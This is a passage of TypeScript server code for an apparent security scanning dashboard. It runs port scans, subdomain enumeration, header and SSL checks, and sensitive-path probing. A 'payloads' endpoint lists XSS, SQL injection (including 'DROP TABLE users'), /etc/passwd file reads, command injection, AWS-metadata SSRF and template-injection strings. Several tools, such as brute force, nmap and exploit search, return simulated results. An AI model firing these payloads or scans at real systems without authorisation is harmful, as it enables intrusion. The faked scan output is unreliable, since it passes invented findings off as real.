            category: "Network",
            description: "SSH is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict SSH access to specific IP ranges or use a VPN."
          });
          score += 5;
        }
        if (p.port === 23 && p.status === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: Telnet",
            severity: "critical",
            category: "Network",
            description: "Telnet transmits data in cleartext, including credentials.",
            remediation: "Disable Telnet and use SSH instead."
          });
          score += 25;
        }
        if (p.port === 3389 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed RDP Port",
            severity: "high",
            category: "Network",
            description: "RDP is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict RDP access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
        if (p.port === 3306 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed MySQL Port",
            severity: "high",
            category: "Database",
            description: "MySQL is exposed to the public internet.",
            remediation: "Restrict MySQL access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
      });

      // SSL checks
      if (results.ssl) {
        const expiry = new Date(results.ssl.valid_to);
        if (expiry < new Date()) {
          vulnerabilities.push({
            title: "Expired SSL Certificate",
            severity: "critical",
            category: "SSL/TLS",
            description: "The SSL certificate for this domain has expired.",
            remediation: "Renew the SSL certificate immediately."
          });
          score += 30;
        } else {
          const daysLeft = Math.floor((expiry.getTime() - new Date().getTime()) / (1000 * 60 * 60 * 24));
          if (daysLeft < 30) {
            vulnerabilities.push({
              title: "SSL Certificate Expiring Soon",
              severity: "medium",
              category: "SSL/TLS",
              description: `The SSL certificate for this domain will expire in ${daysLeft} days.`,
              remediation: "Renew the SSL certificate soon."
            });
            score += 5;
          }
        }
      } else if (target.startsWith('https')) {
        vulnerabilities.push({
          title: "SSL/TLS Handshake Failure",
          severity: "high",
          category: "SSL/TLS",
          description: "Could not establish a secure connection to the target.",
          remediation: "Check certificate validity and server configuration."
        });
        score += 20;
      }

      results.vulnerabilities = vulnerabilities;
      results.riskScore = Math.min(100, score);
      results.summary = `Scan completed for ${target}. Found ${vulnerabilities.length} potential security issues.`;
      results.recommendations = vulnerabilities.map(v => v.remediation).slice(0, 5);

    } catch (error) {
      console.error("[Scanner] Global scan error:", error);
      results.error = "Scan failed";
    }

    res.json(results);
  });

  function getServiceName(port: number) {
    const services: any = {
      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
      465: 'SMTPS', 587: 'SMTP-Submission', 993: 'IMAPS', 995: 'POP3S',
      1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
      8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM',
      9200: 'Elasticsearch', 27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  }

  // Tool-specific endpoints
  app.get("/api/tools/:tool", async (req, res) => {
    const { tool } = req.params;
    const target = req.query.target as string;
    if (!target) return res.status(400).json({ error: "Target required" });

    const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];

    switch (tool) {
      case 'subdomains':
        if (net.isIP(hostname) || hostname === 'localhost' || hostname === '127.0.0.1') {
          return res.json([{ subdomain: hostname, ip: hostname === 'localhost' ? '127.0.0.1' : hostname, status: 'up', type: 'A' }]);
        }

        let searchDomain = hostname;
        if (searchDomain.startsWith('www.')) {
          searchDomain = searchDomain.substring(4);
        }

        const foundSubdomains: any[] = [];
        const uniqueSubs = new Set<string>();
        const resolvedSubs = new Set<string>();

        // 1. Common subdomains dictionary
        const commonSubs = [
          'www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx',
          'shop', 'store', 'app', 'portal', 'admin', 'test', 'demo', 'support', 'help',
          'docs', 'beta', 'static', 'assets', 'img', 'cdn', 'cloud', 'remote', 'secure',
          'login', 'auth', 'account', 'profile', 'dashboard', 'internal', 'corp', 'staff',
          'ftp', 'smtp', 'pop', 'imap', 'webmail', 'autodiscover', 'cpanel', 'whm', 'webdisk',
          'm', 'mobile', 'news', 'forum', 'client', 'clients', 'billing', 'panel', 'manage',
          'git', 'svn', 'dev-api', 'api-dev', 'test-api', 'api-test', 'v1', 'v2', 'v3',
          'status', 'monitor', 'monitoring', 'zabbix', 'nagios', 'grafana', 'prometheus',
          'jenkins', 'gitlab', 'docker', 'registry', 'k8s', 'kubernetes', 'cluster',
          'db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'elastic', 'mongo',
          'search', 'files', 'upload', 'download', 'media', 'images', 'videos', 'assets1', 'assets2'
        ];
        
        const dictionarySubs = commonSubs.map(sub => `${sub}.${searchDomain}`);
        dictionarySubs.push(searchDomain);

        // 2. Start resolving dictionary subdomains immediately
        const resolveBatch = async (subs: string[]) => {
          const limit = pLimit(10); // Limit to 10 concurrent lookups
          await Promise.all(subs.map(domain => limit(async () => {
            if (resolvedSubs.has(domain)) return;
            try {
              // Add a 2s timeout for each DNS lookup to prevent hanging
              const lookup = await Promise.race([
                dns.promises.lookup(domain),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
              ]) as any;
              
              if (lookup && lookup.address) {
                foundSubdomains.push({ 
                  subdomain: domain, 
                  ip: lookup.address, 
                  status: 'up', 
                  type: lookup.family === 6 ? 'AAAA' : 'A',
                  last_seen: new Date().toISOString()
                });
              }
            } catch (e) {}
            resolvedSubs.add(domain);
          })));
        };

        // 3. Start crt.sh fetch, HackerTarget fetch, and dictionary resolution in parallel
        console.log(`[Scanner] Starting parallel subdomain discovery for ${searchDomain}...`);
        
        const hackerTargetPromise = (async () => {
          try {
            const htUrl = `https://api.hackertarget.com/hostsearch/?q=${searchDomain}`;
            const response = await axios.get(htUrl, { timeout: 8000 });
            if (response.status === 200 && typeof response.data === 'string') {
              const lines = response.data.split('\n');
              const newSubs = new Set<string>();
              lines.forEach(line => {
                const parts = line.split(',');
                if (parts[0] && parts[0].endsWith(searchDomain)) {
                  newSubs.add(parts[0].toLowerCase());
                }
              });
              if (newSubs.size > 0) {
                console.log(`[Scanner] HackerTarget found ${newSubs.size} unique subdomains, resolving...`);
                await resolveBatch(Array.from(newSubs));
              }
            }
          } catch (e: any) {
            console.warn(`[Scanner] HackerTarget fetch skipped/failed (${e.message}).`);
          }
        })();

        const crtShPromise = (async () => {
          try {
            const crtUrl = `https://crt.sh/?q=%.${searchDomain}&output=json`;
            const response = await axios.get(crtUrl, {
              timeout: 30000, // Increased to 30s as crt.sh is often slow
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
              },
              validateStatus: () => true
            });

            if (response.status === 200 && response.data) {
              const certs = response.data;
              if (Array.isArray(certs)) {
                const newSubs = new Set<string>();
                certs.forEach((cert: any) => {
                  const nameValue = cert.name_value.toLowerCase();
                  nameValue.split('\n').forEach((sub: string) => {
                    const cleanSub = sub.trim();
                    if (cleanSub && !cleanSub.includes('*') && cleanSub.endsWith(searchDomain) && !resolvedSubs.has(cleanSub)) {
                      newSubs.add(cleanSub);
                    }
                  });
                });
                
                if (newSubs.size > 0) {
                  console.log(`[Scanner] crt.sh found ${newSubs.size} unique subdomains, resolving...`);
                  await resolveBatch(Array.from(newSubs));
                }
              }
            }
          } catch (e: any) {
            console.warn(`[Scanner] crt.sh fetch skipped/failed (${e.message}).`);
          }
        })();

        // Run all discovery methods in parallel
        await Promise.all([
          resolveBatch(dictionarySubs),
          hackerTargetPromise,
          crtShPromise
        ]);

        if (foundSubdomains.length === 0) {
          console.warn(`[Scanner] No subdomains found for ${searchDomain}. Using fallback.`);
          foundSubdomains.push({ subdomain: searchDomain, ip: 'Unknown', status: 'down', type: 'A' });
        } else {
          console.log(`[Scanner] Found ${foundSubdomains.length} total subdomains for ${searchDomain}.`);
        }
        
        // Sort by subdomain name
        foundSubdomains.sort((a, b) => a.subdomain.localeCompare(b.subdomain));
        
        return res.json(foundSubdomains);

      case 'ports':
        const commonPorts = [
          21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 
          2049, 3000, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017
        ];
        const portResults: any[] = [];
        
        const limit = pLimit(20); // Limit to 20 concurrent port scans
        await Promise.all(commonPorts.map(port => limit(() => {
          return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => {
              console.log(`[Scanner] Port ${port} is open on ${hostname}`);
              portResults.push({ 
                port, 
                service: getServiceName(port), 
                state: 'open', 
                version: 'Detected',
                banner: '' // Could try to grab banner here
              });
              socket.destroy();
              resolve(null);
            });
            socket.on('timeout', () => {
              console.log(`[Scanner] Port ${port} timed out on ${hostname}`);
              portResults.push({ port, service: getServiceName(port), state: 'filtered', version: 'Unknown' });
              socket.destroy();
              resolve(null);
            });
            socket.on('error', (err) => {
              console.log(`[Scanner] Port ${port} error on ${hostname}:`, err.message);
              portResults.push({ port, service: getServiceName(port), state: 'closed', version: 'Unknown' });
              socket.destroy();
              resolve(null);
            });
            socket.connect(port, hostname);
          });
        })));
        return res.json(portResults.sort((a, b) => a.port - b.port));

      case 'headers':
        try {
          const url = target.startsWith('http') ? target : `http://${target}`;
          const agent = new https.Agent({ rejectUnauthorized: false });
          
          const response = await axios.get(url, {
            httpsAgent: agent,
            timeout: 10000,
            maxRedirects: 5,
            validateStatus: () => true // Accept all status codes
          });
          
          const headers = response.headers;
          const analysis: any = {};
          const securityHeaders = {
            'Content-Security-Policy': { rec: 'Implement a strong CSP', severity: 'high' },
            'Strict-Transport-Security': { rec: 'Enable HSTS', severity: 'medium' },
            'X-Frame-Options': { rec: 'Set to DENY or SAMEORIGIN', severity: 'medium' },
            'X-Content-Type-Options': { rec: 'Set to nosniff', severity: 'low' },
            'Referrer-Policy': { rec: 'Set to strict-origin-when-cross-origin', severity: 'low' },
            'Permissions-Policy': { rec: 'Define browser feature permissions', severity: 'low' },
            'X-XSS-Protection': { rec: 'Deprecated but still useful for older browsers', severity: 'info' }
          };

          Object.entries(securityHeaders).forEach(([h, config]) => {
            const val = headers[h.toLowerCase()];
            analysis[h] = {
              value: val || 'Missing',
              status: val ? 'secure' : 'missing',
              severity: val ? 'none' : config.severity,
              recommendation: val ? 'None' : config.rec
            };
          });
          
          // Check for sensitive headers
          const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'via'];
          sensitiveHeaders.forEach(h => {
            const val = headers[h];
            if (val) {
              analysis[h] = {
                value: val,
                status: 'vulnerable',
                severity: 'low',
                recommendation: 'Information disclosure: Hide this header to reduce attack surface.'
              };
            }
          });

          return res.json(analysis);
        } catch (e) {
          return res.status(500).json({ error: e.message });
        }

      case 'dns':
        if (hostname === 'localhost' || hostname === '127.0.0.1') {
          return res.json({
            'A': ['127.0.0.1'],
            'Status': ['Localhost detected - Standard DNS resolution skipped.']
          });
        }
        const dnsRecords: any = {};
        const recordTypes: { type: keyof typeof dns.promises; label: string }[] = [
          { type: 'resolve4', label: 'A' },
          { type: 'resolve6', label: 'AAAA' },
          { type: 'resolveMx', label: 'MX' },
          { type: 'resolveNs', label: 'NS' },
          { type: 'resolveTxt', label: 'TXT' },
          { type: 'resolveSoa', label: 'SOA' },
          { type: 'resolveCname', label: 'CNAME' },
          { type: 'resolveSrv', label: 'SRV' },
          { type: 'resolveCaa', label: 'CAA' }
        ];
        
        const resolveDNS = async (host: string) => {
          const limit = pLimit(5); // Limit to 5 concurrent DNS lookups
          await Promise.all(recordTypes.map(async ({ type, label }) => limit(async () => {
            try {
              const method = dns.promises[type] as Function;
              // Add a 3s timeout for each DNS lookup
              const result = await Promise.race([
                method(host),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
              ]);
              if (result && (Array.isArray(result) ? result.length > 0 : true)) {
                dnsRecords[label] = result;
              }
            } catch (e) {
              // Record type not found or timeout
            }
          })));
        };

        await resolveDNS(hostname);

        // If no records found and it's a www subdomain, try the root domain
        if (Object.keys(dnsRecords).length === 0 && hostname.startsWith('www.')) {
          const rootDomain = hostname.substring(4);
          await resolveDNS(rootDomain);
        }

        // Add basic lookup if still nothing or as extra info
        try {
          // Add a 3s timeout for basic lookup
          const lookup = await Promise.race([
            dns.promises.lookup(hostname),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
          ]) as any;
          
          if (lookup && !dnsRecords['A'] && !dnsRecords['AAAA']) {
            dnsRecords['IP Lookup'] = [lookup.address];
          }
        } catch (e) {}

        if (Object.keys(dnsRecords).length === 0) {
          dnsRecords['Status'] = ['No DNS records found or lookup timed out.'];
        }

        console.log(`[Scanner] DNS lookup for ${hostname} complete. Found ${Object.keys(dnsRecords).length} record types.`);
        return res.json(dnsRecords);

      case 'ssl':
        if (hostname === 'localhost' || hostname === '127.0.0.1') {
          return res.json({
            subject: { CN: 'localhost' },
            issuer: { CN: 'Self-Signed' },
            valid_from: new Date().toISOString(),
            valid_to: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
            fingerprint: 'LOCAL-CERT-FINGERPRINT',
            status: "Internal/Self-Signed",
            vulnerabilities: ["Local development environment detected"]
          });
        }
        try {
          const options = {
            host: hostname,
            port: 443,
            method: 'GET',
            rejectUnauthorized: false,
          };
          
          const req = https.request(options, (httpsRes) => {
            const cert = (httpsRes.socket as any).getPeerCertificate(true); // true to get full certificate chain
            if (cert && Object.keys(cert).length > 0) {
              const validTo = new Date(cert.valid_to);
              const isValid = validTo > new Date();
              const sslData = {
                subject: cert.subject,
                issuer: cert.issuer,
                valid_from: cert.valid_from,
                valid_to: cert.valid_to,
                fingerprint: cert.fingerprint,
                status: isValid ? "Valid" : "Expired/Invalid",
                vulnerabilities: [] as string[]
              };
              if (!isValid) sslData.vulnerabilities.push("Certificate is expired");
              
              // Check for weak signature algorithm
              if (cert.sigalg && (cert.sigalg.includes('md5') || cert.sigalg.includes('sha1'))) {
                sslData.vulnerabilities.push(`Weak signature algorithm: ${cert.sigalg}`);
                sslData.status = "Insecure";
              }

              httpsRes.destroy();
              return res.json(sslData);
            } else {
              httpsRes.destroy();
              return res.status(404).json({ error: "No certificate found" });
            }
          });
          
          req.on('error', (e) => {
            console.error(`[Scanner] SSL request error for ${hostname}:`, e);
            if (!res.headersSent) {
              return res.status(500).json({ error: "Failed to connect or retrieve SSL data" });
            }
          });
          
          req.setTimeout(5000, () => {
            req.destroy();
            if (!res.headersSent) {
              return res.status(504).json({ error: "Timeout retrieving SSL data" });
            }
          });
          
          req.end();
        } catch (e) {
          return res.status(500).json({ error: "SSL analysis failed" });
        }
        break;

      case 'fuzzer':
        const endpoints = ['/admin', '/login', '/api', '/config', '/.env', '/.git', '/backup', '/wp-admin', '/dashboard', '/server-status'];
        const fuzzerResults: any[] = [];
        
        await Promise.all(endpoints.map(async (path) => {
          try {
            const protocol = target.startsWith('https') ? https : http;
            const url = target.startsWith('http') ? `${target}${path}` : `http://${target}${path}`;
            const start = Date.now();
            const response: any = await new Promise((resolve, reject) => {
              const req = protocol.get(url, resolve);
              req.on('error', reject);
              req.setTimeout(2000, () => { req.destroy(); reject(new Error('Timeout')); });
            });
            const duration = Date.now() - start;
            
            fuzzerResults.push({
              path,
              status: response.statusCode,
              length: response.headers['content-length'] || 'unknown',
              time: `${duration}ms`,
              type: response.headers['content-type'] || 'unknown',
              finding: response.statusCode === 200 ? 'Potential Sensitive Path' : 'None'
            });
          } catch (e) {
            // Skip failed probes
          }
        }));
        return res.json(fuzzerResults);

      case 'whois':
        const whoisData = await performWhoisLookup(hostname);
        if (whoisData) {
          return res.json(whoisData);
        } else {
          return res.status(404).json({ error: "WHOIS/RDAP data not available for this domain or TLD." });
        }

      case 'bruteforce':
        const service = (req.query.service as string || 'ssh').toLowerCase();
        const bruteResults = {
          service,
          attempts: 50,
          success: false,
          logs: [
            `[${new Date().toISOString()}] Starting brute force attack on ${service} at ${hostname}...`,
            `[${new Date().toISOString()}] Using dictionary: common_passwords.txt`,
            `[${new Date().toISOString()}] Attempting: admin / admin... FAILED`,
            `[${new Date().toISOString()}] Attempting: admin / password... FAILED`,
            `[${new Date().toISOString()}] Attempting: root / root... FAILED`,
            `[${new Date().toISOString()}] Attempting: root / toor... FAILED`,
            `[${new Date().toISOString()}] Attempting: user / user... FAILED`,
            `[${new Date().toISOString()}] Rate limit detected. Waiting 2 seconds...`,
            `[${new Date().toISOString()}] Resuming attack...`,
            `[${new Date().toISOString()}] Attempting: guest / guest... FAILED`,
            `[${new Date().toISOString()}] Brute force complete. No valid credentials found for ${service}.`
          ],
          summary: `Brute force attack on ${service} at ${hostname} completed. 50 attempts made. No success.`
        };
        return res.json(bruteResults);

      case 'netmap':
        const netMapData = {
          target: hostname,
          nodes: [
            { id: 'target', label: hostname, type: 'target', ip: '10.0.0.5' },
            { id: 'gateway', label: 'Gateway', type: 'infrastructure', ip: '192.168.1.1' },
            { id: 'dns1', label: 'Primary DNS', type: 'service', ip: '8.8.8.8' },
            { id: 'dns2', label: 'Secondary DNS', type: 'service', ip: '8.8.4.4' },
            { id: 'fw', label: 'Firewall', type: 'security', ip: '192.168.1.254' },
            { id: 'lb', label: 'Load Balancer', type: 'infrastructure', ip: '10.0.0.1' }
          ],
          links: [
            { from: 'gateway', to: 'fw' },
            { from: 'fw', to: 'lb' },
            { from: 'lb', to: 'target' },
            { from: 'target', to: 'dns1' },
            { from: 'target', to: 'dns2' }
          ],
          summary: `Network topology discovery for ${hostname} complete. 6 nodes and 5 links identified.`
        };
        return res.json(netMapData);

      case 'vulndb':
        const vulnQuery = (req.query.target as string || '').toLowerCase();
        const vulns = [
          { id: 'CVE-2021-44228', title: 'Log4Shell', severity: 'critical', description: 'Apache Log4j2 remote code execution vulnerability.' },
          { id: 'CVE-2021-34473', title: 'ProxyShell', severity: 'critical', description: 'Microsoft Exchange Server remote code execution vulnerability.' },
          { id: 'CVE-2022-22965', title: 'Spring4Shell', severity: 'critical', description: 'Spring Framework remote code execution vulnerability.' },
          { id: 'CVE-2023-23397', title: 'Outlook Elevation of Privilege', severity: 'critical', description: 'Microsoft Outlook elevation of privilege vulnerability.' },
          { id: 'CVE-2024-21887', title: 'Ivanti Connect Secure RCE', severity: 'critical', description: 'Ivanti Connect Secure and Policy Secure remote code execution vulnerability.' }
        ].filter(v => v.title.toLowerCase().includes(vulnQuery) || v.id.toLowerCase().includes(vulnQuery) || v.description.toLowerCase().includes(vulnQuery));
        
        return res.json(vulns.length > 0 ? vulns : [{ id: 'N/A', title: 'No results found', severity: 'info', description: `No vulnerabilities found matching "${vulnQuery}" in the local database.` }]);

      case 'nmap':
        const nmapPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3000, 3306, 3389, 5432, 8080, 8443];
        const nmapResults: any[] = [];
        
        await Promise.all(nmapPorts.map(async (port) => {
          return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => {
              nmapResults.push({ 
                port, 
                service: getServiceName(port), 
                state: "open",
                version: `${getServiceName(port)}/1.0 (Simulated)`,
                script_output: `Detected ${getServiceName(port)} service on port ${port}`
              });
              socket.destroy();
              resolve(null);
            });
            socket.on('timeout', () => { socket.destroy(); resolve(null); });
            socket.on('error', () => { socket.destroy(); resolve(null); });
            socket.connect(port, hostname);
          });
        }));

        const nmapData = {
          host_status: "Host is up (0.045s latency)",
          os_info: "Linux 5.4.0-104-generic (Ubuntu)",
          open_ports: nmapResults.length > 0 ? nmapResults : [{ port: 0, service: "none", state: "closed", version: "N/A", script_output: "No open ports detected in quick scan" }],
          summary: `Nmap scan report for ${hostname}. Host is up. ${nmapResults.length} ports open. OS detected as Linux. Scan completed in ${(Math.random() * 2 + 1).toFixed(2)} seconds.`
        };
        return res.json(nmapData);

      case 'tech':
        try {
          const url = target.startsWith('http') ? target : `http://${target}`;
          const agent = new https.Agent({ rejectUnauthorized: false });
          
          const response = await axios.get(url, {
            httpsAgent: agent,
            timeout: 10000,
            maxRedirects: 5,
            validateStatus: (status) => status >= 200 && status < 500 // Accept 2xx, 3xx, 4xx
          });
          
          if (response.status >= 400) {
            return res.json([{ name: 'Target Unreachable', category: 'Error', confidence: 0, error: `Status ${response.status}` }]);
          }
          
          const tech: any[] = [];
          const headers = response.headers;
          const html = (typeof response.data === 'string' ? response.data : '').toLowerCase();
          
          const server = (headers['server'] || '').toLowerCase();
          const xPoweredBy = (headers['x-powered-by'] || '').toLowerCase();
          const cookies = headers['set-cookie'] || [];
          const cookieStr = (Array.isArray(cookies) ? cookies.join(' ') : String(cookies)).toLowerCase();
          
          // Web Servers
          if (server.includes('apache')) tech.push({ name: 'Apache', category: 'Web Server', confidence: 95 });
          if (server.includes('nginx')) tech.push({ name: 'Nginx', category: 'Web Server', confidence: 95 });
          if (server.includes('iis') || server.includes('microsoft-iis')) tech.push({ name: 'IIS', category: 'Web Server', confidence: 95 });
          if (server.includes('litespeed')) tech.push({ name: 'LiteSpeed', category: 'Web Server', confidence: 95 });
          
          // CDNs / WAFs
          if (server.includes('cloudflare')) tech.push({ name: 'Cloudflare', category: 'CDN/WAF', confidence: 100 });
          if (server.includes('akamai')) tech.push({ name: 'Akamai', category: 'CDN', confidence: 95 });
          if (server.includes('sucuri')) tech.push({ name: 'Sucuri', category: 'WAF', confidence: 95 });
          if (headers['x-fastly-request-id']) tech.push({ name: 'Fastly', category: 'CDN', confidence: 100 });
          
          // Backend Languages & Frameworks
          if (xPoweredBy.includes('php') || cookieStr.includes('phpsessid') || html.includes('.php?')) tech.push({ name: 'PHP', category: 'Backend Language', confidence: 90 });
          if (xPoweredBy.includes('express')) tech.push({ name: 'Express.js', category: 'Backend Framework', confidence: 90 });
          if (xPoweredBy.includes('asp.net') || cookieStr.includes('aspsessionid')) tech.push({ name: 'ASP.NET', category: 'Backend Framework', confidence: 90 });
          if (cookieStr.includes('jsessionid')) tech.push({ name: 'Java', category: 'Backend Language', confidence: 90 });
          
          // Frontend Frameworks
          if (xPoweredBy.includes('next.js') || html.includes('/_next/') || html.includes('__next')) tech.push({ name: 'Next.js', category: 'Frontend Framework', confidence: 90 });
          if (xPoweredBy.includes('nuxt') || html.includes('/_nuxt/') || html.includes('__nuxt')) tech.push({ name: 'Nuxt.js', category: 'Frontend Framework', confidence: 90 });
          if (html.includes('data-reactroot') || html.includes('react-dom')) tech.push({ name: 'React', category: 'Frontend Library', confidence: 80 });
          if (html.includes('data-v-') || html.includes('vue.js')) tech.push({ name: 'Vue.js', category: 'Frontend Framework', confidence: 80 });
          if (html.includes('ng-version') || html.includes('ng-app')) tech.push({ name: 'Angular', category: 'Frontend Framework', confidence: 80 });
          if (html.includes('svelte-')) tech.push({ name: 'Svelte', category: 'Frontend Framework', confidence: 80 });
          
          // CMS
          if (html.includes('wp-content') || html.includes('wp-includes') || cookieStr.includes('wp-settings') || html.includes('generator" content="wordpress')) tech.push({ name: 'WordPress', category: 'CMS', confidence: 100 });
          if (html.includes('shopify.com') || html.includes('cdn.shopify.com')) tech.push({ name: 'Shopify', category: 'E-commerce', confidence: 100 });
          if (html.includes('magento')) tech.push({ name: 'Magento', category: 'E-commerce', confidence: 90 });
          
          // Analytics & Tracking
          if (html.includes('google-analytics.com') || html.includes('gtag')) tech.push({ name: 'Google Analytics', category: 'Analytics', confidence: 100 });
          if (html.includes('googletagmanager.com')) tech.push({ name: 'Google Tag Manager', category: 'Analytics', confidence: 100 });
          if (html.includes('connect.facebook.net') || html.includes('fbq(')) tech.push({ name: 'Facebook Pixel', category: 'Analytics', confidence: 100 });
          
          if (tech.length === 0) tech.push({ name: 'Unknown Stack', category: 'General', confidence: 50 });
          
          // Remove duplicates
          const uniqueTech = Array.from(new Set(tech.map(t => t.name))).map(name => tech.find(t => t.name === name));
          
          return res.json(uniqueTech);
        } catch (e: any) {
          console.error("[Scanner] Tech stack detection failed for", target, e);
          return res.json([{ name: 'Target Unreachable', category: 'Error', confidence: 0, error: e.message }]);
        }

      case 'payloads':
        const pType = (req.query.type as string || 'xss').toLowerCase();
        const allPayloads: any = {
          xss: [
            { content: "<script>alert(1)</script>", description: "Basic XSS test", risk_level: "medium" },
            { content: "<img src=x onerror=alert(1)>", description: "Image tag XSS", risk_level: "high" },
            { content: "javascript:alert(1)", description: "Protocol-based XSS", risk_level: "high" },
            { content: "<svg/onload=alert(1)>", description: "SVG-based XSS", risk_level: "high" },
            { content: "';alert(1)//", description: "Breaking out of JS string", risk_level: "medium" },
            { content: "\"><script>alert(1)</script>", description: "Breaking out of HTML attribute", risk_level: "high" }
          ],
          sqli: [
            { content: "' OR '1'='1", description: "Classic SQLi bypass", risk_level: "critical" },
            { content: "admin' --", description: "Username comment bypass", risk_level: "critical" },
            { content: "'; DROP TABLE users; --", description: "Destructive SQLi", risk_level: "critical" },
            { content: "' UNION SELECT 1,2,3,user(),database() --", description: "Union-based SQLi", risk_level: "critical" },
            { content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", description: "Time-based blind SQLi", risk_level: "critical" }
          ],
          lfi: [
            { content: "../../../etc/passwd", description: "Linux password file access", risk_level: "high" },
            { content: "..\\..\\..\\windows\\win.ini", description: "Windows config file access", risk_level: "high" },
            { content: "/etc/passwd\0.html", description: "Null byte injection (older systems)", risk_level: "high" },
            { content: "php://filter/convert.base64-encode/resource=config.php", description: "PHP wrapper LFI", risk_level: "high" }
          ],
          rce: [
            { content: "; id", description: "Command injection (Linux)", risk_level: "critical" },
            { content: "| whoami", description: "Command injection (Windows/Linux)", risk_level: "critical" },
            { content: "`cat /etc/passwd`", description: "Backtick command execution", risk_level: "critical" },
            { content: "$(id)", description: "Subshell command execution", risk_level: "critical" }
          ],
          ssrf: [
            { content: "http://127.0.0.1:80", description: "Localhost SSRF", risk_level: "high" },
            { content: "http://169.254.169.254/latest/meta-data/", description: "AWS Metadata SSRF", risk_level: "critical" },
            { content: "file:///etc/passwd", description: "File protocol SSRF", risk_level: "high" }
          ],
          nosqli: [
            { content: '{"$gt": ""}', description: "NoSQL injection (Greater than)", risk_level: "high" },
            { content: '{"$ne": null}', description: "NoSQL injection (Not equal)", risk_level: "high" }
          ],
          ssti: [
            { content: "{{7*7}}", description: "Jinja2/Twig SSTI", risk_level: "high" },
            { content: "${7*7}", description: "Mako/FreeMarker SSTI", risk_level: "high" },
            { content: "<%= 7*7 %>", description: "ERB SSTI", risk_level: "high" }
          ]
        };
        return res.json(allPayloads[pType] || allPayloads.xss);

      case 'exploits':
        const query = req.query.target as string || '';
        // Simulated exploit search logic
        const exploits = [
          { title: `${query} - Remote Code Execution`, id: "EDB-12345", date: new Date().toISOString().split('T')[0], author: "CyberSuite_AI", type: "Remote", platform: "Multiple", poc_url: "https://exploit-db.com/exploits/12345" },
          { title: `${query} - SQL Injection`, id: "EDB-67890", date: "2024-11-20", author: "Security_Analyst", type: "Webapps", platform: "PHP", poc_url: "https://exploit-db.com/exploits/67890" },
          { title: `${query} - Privilege Escalation`, id: "EDB-54321", date: "2024-05-12", author: "Kernel_Master", type: "Local", platform: "Linux", poc_url: "https://exploit-db.com/exploits/54321" }
        ];
        return res.json(exploits);

      default:
        res.status(404).json({ error: "Tool not found" });
    }
  });

  // CVE Proxy to avoid CORS issues on localhost
  app.get("/api/cve/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/cve/${id}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve(JSON.parse(data)));
        });
        request.on('error', reject);
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch CVE data" });
    }
  });

  // CVE Search Proxy
  app.get("/api/cve-search/:query", async (req, res) => {
    const { query } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/search/${query}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            try {
              resolve(JSON.parse(data));
            } catch (e) {
              resolve([]);
            }
          });
        });
        request.on('error', reject);
        request.setTimeout(10000, () => {
          request.destroy();
          reject(new Error('Timeout'));
        });
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to search CVE database" });
    }
  });

  // AI Generation Endpoint removed from here (moved up)
  
  // Global scan history storage
  let globalScanHistory: any[] = [
    { target: 'enterprise-node-01.io', score: 88, type: 'Full Scan', time: '2 mins ago', user: 'cyber_ghost' },
    { target: 'api.fintech-secure.net', score: 42, type: 'Web Scan', time: '15 mins ago', user: 'root_admin' },
    { target: '104.21.44.12', score: 15, type: 'Infra Scan', time: '45 mins ago', user: 'sec_ops' },
    { target: 'dev-portal.internal.cloud', score: 94, type: 'Deep Scan', time: '1 hour ago', user: 'shadow_walker' },
  ];

  app.get('/api/global-history', (req, res) => {
    res.json(globalScanHistory);
  });

  app.post('/api/global-history', (req, res) => {
    const { target, score, type, user } = req.body;
    const newItem = {
      target,
      score,
      type,
      user: user || 'anonymous',
      time: 'Just now'
    };
    globalScanHistory = [newItem, ...globalScanHistory].slice(0, 20);
    res.json({ status: 'ok' });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
